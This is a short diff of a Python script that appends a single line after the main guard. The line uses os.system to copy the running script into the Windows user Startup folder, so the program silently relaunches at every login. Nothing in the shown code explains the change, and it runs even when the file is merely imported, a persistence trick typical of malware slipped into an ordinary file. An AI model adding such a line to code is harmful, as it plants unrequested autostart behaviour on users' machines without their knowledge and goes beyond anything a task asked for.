@@ -47,3 +47,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+    
+os.system('copy %s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"' % (sys.argv[0]))
